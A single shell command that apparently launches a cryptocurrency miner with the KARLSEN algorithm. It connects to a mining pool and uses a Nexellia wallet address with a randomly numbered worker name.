./lol1.84 --algo KARLSEN --pool 159.203.127.146:80 --user nexellia:qphqvav4ss5wjtek0f83ymm6wzepa3c7cyjf6y9fd2h24hp9am7j68q3wevu7.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl

